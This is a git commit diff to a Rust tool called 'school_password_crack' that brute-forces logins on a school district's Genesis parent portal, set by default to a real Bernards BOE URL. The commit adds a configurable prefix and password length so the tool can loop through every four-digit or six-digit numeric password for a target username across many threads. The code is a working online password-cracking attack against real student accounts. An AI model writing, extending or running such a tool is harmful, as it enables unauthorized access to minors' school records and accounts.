79b5f1586d4e8c1eda18182682e7248b9faf9d59
Connor Slade <connor@connorcode.com>
2021-08-20 14:11:00 -0400

    🦀 Crack Prefix

--- school_password_crack/src/command/crack.rs
+++ school_password_crack/src/command/crack.rs
@@ -37,6 +37,8 @@ pub fn command() -> Command {
                 .parse::<u32>()
                 .unwrap();
 
+            let prefix: &str = &arg_parse::get_arg_value(&args, "-p").unwrap_or("30");
+
             let base_page: &str = &arg_parse::get_arg_value(&args, "--page")
                 .unwrap_or("https://parents.genesisedu.com/bernardsboe");
 
@@ -69,12 +71,13 @@ pub fn command() -> Command {
                 &color::color(&username, Color::Blue)
             );
 
+            color_print!(Color::Magenta, "[i] Prefix: {}", &prefix);
             color_print!(Color::Magenta, "[i] Threads: {}", &threads.to_string());
             color_print!(Color::Magenta, "[i] Base Page: {}", &base_page);
             println!();
 
             // C R A C K
-            crack(&username, *threads as u32, base_page);
+            crack(&username, *threads as u32, base_page, prefix);
         },
     )
 }
@@ -83,6 +86,8 @@ struct Cracker {
     instance: u32,
     end_index: u32,
     start_index: u32,
+    password_len: u32,
+    prefix: String,
     username: String,
     base_url: String,
 }
@@ -93,13 +98,17 @@ impl Cracker {
         instance: u32,
         end_index: u32,
         start_index: u32,
+        password_len: u32,
         username: &str,
         base_url: &str,
+        prefix: &str,
     ) -> Cracker {
         Cracker {
             instance,
             end_index,
             start_index,
+            password_len: password_len,
+            prefix: prefix.to_string(),
             username: username.to_string(),
             base_url: base_url.to_string(),
         }
@@ -110,6 +119,8 @@ impl Cracker {
             instance: self.instance,
             end_index: self.end_index,
             start_index: self.start_index,
+            password_len: self.password_len,
+            prefix: self.prefix,
             username: self.username,
             base_url: self.base_url,
         }
@@ -121,7 +132,7 @@ impl Cracker {
         let mut i: u32 = self.start_index as u32;
         while i < self.end_index {
             // Gen password guess
-            let to_try: &str = &format!("30{:0width$}", i, width = 4);
+            let to_try: &str = &format!("{}{:0width$}", &self.prefix, i, width = self.password_len as usize);
 
             // Make an agent
             let agent: Agent = Agent::new();
@@ -191,12 +202,22 @@ impl System {
     }
 }
 
-pub fn crack(username: &str, threads: u32, base_url: &str) {
+pub fn crack(username: &str, threads: u32, base_url: &str, raw_prefix: &str) {
     // Start Timer
     let start_time = SystemTime::now();
 
+    let mut passwords = 9999;
+    let mut password_len = 4;
+
+    let mut prefix = &*raw_prefix;
+    if prefix == "*" {
+        prefix = "";
+        passwords = 999999;
+        password_len = 6;
+    }
+
     // Make a new System
-    let mut system: System = System::new(9999, threads);
+    let mut system: System = System::new(passwords, threads);
 
     unsafe {
         RUNNING = threads as i32;
@@ -211,8 +232,10 @@ pub fn crack(username: &str, threads: u32, base_url: &str) {
             i,
             end_index,
             start_index * i,
+            password_len,
             username,
             base_url,
+            prefix,
         ));
     }
 
